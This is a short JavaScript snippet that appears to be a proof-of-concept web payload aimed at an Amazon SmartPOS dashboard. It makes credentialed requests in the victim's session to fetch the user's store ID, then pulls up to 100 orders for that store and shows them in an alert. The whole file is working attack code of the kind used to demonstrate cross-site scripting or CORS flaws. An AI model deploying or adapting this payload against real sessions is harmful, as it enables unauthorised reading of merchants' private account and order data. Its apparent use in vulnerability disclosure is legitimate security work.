(function() {
    function fetchUserDetails() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://smartpos.amazon.in/api-db/resources/v2/dashboard/user/getUser", true);
        xhr.withCredentials = true;

        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        var storeId = response.onlineShopId;

                        if (storeId) {
                            sendOfferRequest(storeId);
                        } else {
                            alert("Error: storeId not found in response.");
                        }
                    } catch (e) {
                        alert("Failed to parse response or find storeId.");
                    }
                } else {
                    alert("GET request failed with status: " + xhr.status);
                }
            }
        };

        xhr.send();
    }

    function sendOfferRequest(storeId) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", `https://smartpos.amazon.in/api-orders/resources/v3/orders/${storeId}/?pageSize=100`, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.withCredentials = true;

        var requestBody = JSON.stringify({});

        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    // Formatting response for better readability
                    var formattedResponse = JSON.stringify(JSON.parse(xhr.responseText), null, 2);
                    alert("Response:\n" + formattedResponse);
                } else {
                    alert("POST request failed with status: " + xhr.status);
                }
            }
        };

        xhr.send(requestBody);
    }

    setTimeout(fetchUserDetails, 2000);
})();
